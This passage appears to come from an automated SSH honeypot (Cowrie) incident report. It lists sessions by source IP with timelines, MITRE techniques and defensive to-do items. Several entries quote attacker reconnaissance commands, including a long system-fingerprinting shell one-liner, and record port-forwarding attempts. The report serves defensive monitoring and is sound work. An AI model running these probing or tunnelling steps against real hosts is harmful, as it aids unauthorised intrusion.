| **Last Seen** | 2026-08-30 13:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:57:55` | `cowrie.session.connect` |
| `2026-08-30 13:57:56` | `cowrie.client.version` |
| `2026-08-30 13:57:56` | `cowrie.client.kex` |
| `2026-08-30 13:57:57` | `cowrie.login.success` |
| `2026-08-30 13:57:57` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.174.62[.]233` to AbuseIPDB if not already reported
- [ ] Block `212.174.62[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af334206e84

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:58 |
| **Last Seen** | 2026-08-30 13:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:58:48` | `cowrie.session.connect` |
| `2026-08-30 13:58:48` | `cowrie.client.version` |
| `2026-08-30 13:58:48` | `cowrie.client.kex` |
| `2026-08-30 13:58:49` | `cowrie.login.success` |
| `2026-08-30 13:58:51` | `cowrie.session.params` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.success` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.command.input` |
| `2026-08-30 13:58:51` | `cowrie.log.closed` |
| `2026-08-30 13:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5044be8aecd8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:59 |
| **Last Seen** | 2026-08-30 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:59:32` | `cowrie.session.connect` |
| `2026-08-30 13:59:32` | `cowrie.client.version` |
| `2026-08-30 13:59:32` | `cowrie.client.kex` |
| `2026-08-30 13:59:33` | `cowrie.login.success` |
| `2026-08-30 13:59:34` | `cowrie.session.params` |
| `2026-08-30 13:59:34` | `cowrie.command.input` |
| `2026-08-30 13:59:34` | `cowrie.log.closed` |
| `2026-08-30 13:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e566cd863363

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:59 |
| **Last Seen** | 2026-08-30 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:59:36` | `cowrie.session.connect` |
| `2026-08-30 13:59:36` | `cowrie.client.version` |
| `2026-08-30 13:59:36` | `cowrie.client.kex` |
| `2026-08-30 13:59:37` | `cowrie.login.success` |
| `2026-08-30 13:59:37` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:59:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:59:37` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ab93482f62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:00 |
| **Last Seen** | 2026-08-30 14:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:00:33` | `cowrie.session.connect` |
| `2026-08-30 14:00:33` | `cowrie.client.version` |
| `2026-08-30 14:00:33` | `cowrie.client.kex` |
| `2026-08-30 14:00:35` | `cowrie.login.success` |
| `2026-08-30 14:00:36` | `cowrie.session.params` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.success` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.command.input` |
| `2026-08-30 14:00:36` | `cowrie.log.closed` |
| `2026-08-30 14:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2417224c9e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:02 |
| **Last Seen** | 2026-08-30 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:02:03` | `cowrie.session.connect` |
| `2026-08-30 14:02:03` | `cowrie.client.version` |
| `2026-08-30 14:02:03` | `cowrie.client.kex` |
| `2026-08-30 14:02:03` | `cowrie.login.success` |
| `2026-08-30 14:02:04` | `cowrie.session.params` |
| `2026-08-30 14:02:04` | `cowrie.command.input` |
| `2026-08-30 14:02:04` | `cowrie.log.closed` |
| `2026-08-30 14:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eab929f6e03c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:02 |
| **Last Seen** | 2026-08-30 14:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:02:20` | `cowrie.session.connect` |
| `2026-08-30 14:02:20` | `cowrie.client.version` |
| `2026-08-30 14:02:20` | `cowrie.client.kex` |
| `2026-08-30 14:02:21` | `cowrie.login.success` |
| `2026-08-30 14:02:22` | `cowrie.session.params` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.success` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:22` | `cowrie.command.input` |
| `2026-08-30 14:02:23` | `cowrie.log.closed` |
| `2026-08-30 14:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9becea12ec58

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:04 |
| **Last Seen** | 2026-08-30 14:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:04:09` | `cowrie.session.connect` |
| `2026-08-30 14:04:09` | `cowrie.client.version` |
| `2026-08-30 14:04:09` | `cowrie.client.kex` |
| `2026-08-30 14:04:10` | `cowrie.login.success` |
| `2026-08-30 14:04:12` | `cowrie.session.params` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.success` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.command.input` |
| `2026-08-30 14:04:12` | `cowrie.log.closed` |
| `2026-08-30 14:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b832b4342c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:04 |
| **Last Seen** | 2026-08-30 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:04:34` | `cowrie.session.connect` |
| `2026-08-30 14:04:34` | `cowrie.client.version` |
| `2026-08-30 14:04:34` | `cowrie.client.kex` |
| `2026-08-30 14:04:34` | `cowrie.login.success` |
| `2026-08-30 14:04:35` | `cowrie.session.params` |
| `2026-08-30 14:04:35` | `cowrie.command.input` |
| `2026-08-30 14:04:35` | `cowrie.log.closed` |
| `2026-08-30 14:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de07afd9187c

| Field | Detail |
|---|---|
| **Source IP** | `217.211.15[.]160` |
| **First Seen** | 2026-08-30 14:05 |
| **Last Seen** | 2026-08-30 14:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:05:36` | `cowrie.session.connect` |
| `2026-08-30 14:05:37` | `cowrie.client.version` |
| `2026-08-30 14:05:37` | `cowrie.client.kex` |
| `2026-08-30 14:05:38` | `cowrie.login.success` |
| `2026-08-30 14:05:38` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.211.15[.]160` to AbuseIPDB if not already reported
- [ ] Block `217.211.15[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0044e97665f8

| Field | Detail |
|---|---|
| **Source IP** | `70.183.235[.]233` |
| **First Seen** | 2026-08-30 14:05 |
| **Last Seen** | 2026-08-30 14:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:05:43` | `cowrie.session.connect` |
| `2026-08-30 14:05:44` | `cowrie.client.version` |
| `2026-08-30 14:05:44` | `cowrie.client.kex` |
| `2026-08-30 14:05:45` | `cowrie.login.success` |
| `2026-08-30 14:05:46` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.183.235[.]233` to AbuseIPDB if not already reported
- [ ] Block `70.183.235[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8b00ef77b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:05 |
| **Last Seen** | 2026-08-30 14:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:05:54` | `cowrie.session.connect` |
| `2026-08-30 14:05:54` | `cowrie.client.version` |
| `2026-08-30 14:05:54` | `cowrie.client.kex` |
| `2026-08-30 14:05:56` | `cowrie.login.success` |
| `2026-08-30 14:05:57` | `cowrie.session.params` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.success` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:57` | `cowrie.command.input` |
| `2026-08-30 14:05:58` | `cowrie.log.closed` |
| `2026-08-30 14:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-434b87f3d734

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:06 |
| **Last Seen** | 2026-08-30 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:06:47` | `cowrie.session.connect` |
| `2026-08-30 14:06:47` | `cowrie.client.version` |
| `2026-08-30 14:06:47` | `cowrie.client.kex` |
| `2026-08-30 14:06:48` | `cowrie.login.success` |
| `2026-08-30 14:06:48` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:06:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:06:49` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eb709b802c7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:06 |
| **Last Seen** | 2026-08-30 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:06:57` | `cowrie.session.connect` |
| `2026-08-30 14:06:57` | `cowrie.client.version` |
| `2026-08-30 14:06:57` | `cowrie.client.kex` |
| `2026-08-30 14:06:57` | `cowrie.login.success` |
| `2026-08-30 14:06:58` | `cowrie.session.params` |
| `2026-08-30 14:06:58` | `cowrie.command.input` |
| `2026-08-30 14:06:58` | `cowrie.log.closed` |
| `2026-08-30 14:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4984b02d05fa

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-30 14:07 |
| **Last Seen** | 2026-08-30 14:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:07:16` | `cowrie.session.connect` |
| `2026-08-30 14:07:17` | `cowrie.client.version` |
| `2026-08-30 14:07:17` | `cowrie.client.kex` |
| `2026-08-30 14:07:19` | `cowrie.login.success` |
| `2026-08-30 14:07:20` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5834b89217cf

| Field | Detail |
|---|---|
| **Source IP** | `178.224.53[.]154` |
| **First Seen** | 2026-08-30 14:07 |
| **Last Seen** | 2026-08-30 14:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:07:25` | `cowrie.session.connect` |
| `2026-08-30 14:07:26` | `cowrie.client.version` |
| `2026-08-30 14:07:26` | `cowrie.client.kex` |
| `2026-08-30 14:07:27` | `cowrie.login.success` |
| `2026-08-30 14:07:27` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.224.53[.]154` to AbuseIPDB if not already reported
- [ ] Block `178.224.53[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499c2a67f50e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:07 |
| **Last Seen** | 2026-08-30 14:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:07:34` | `cowrie.session.connect` |
| `2026-08-30 14:07:34` | `cowrie.client.version` |
| `2026-08-30 14:07:34` | `cowrie.client.kex` |
| `2026-08-30 14:07:36` | `cowrie.login.success` |
| `2026-08-30 14:07:37` | `cowrie.session.params` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.success` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.command.input` |
| `2026-08-30 14:07:37` | `cowrie.log.closed` |
| `2026-08-30 14:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d8673009c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:09 |
| **Last Seen** | 2026-08-30 14:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:09:14` | `cowrie.session.connect` |
| `2026-08-30 14:09:14` | `cowrie.client.version` |
| `2026-08-30 14:09:14` | `cowrie.client.kex` |
| `2026-08-30 14:09:16` | `cowrie.login.success` |
| `2026-08-30 14:09:17` | `cowrie.session.params` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.success` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:17` | `cowrie.command.input` |
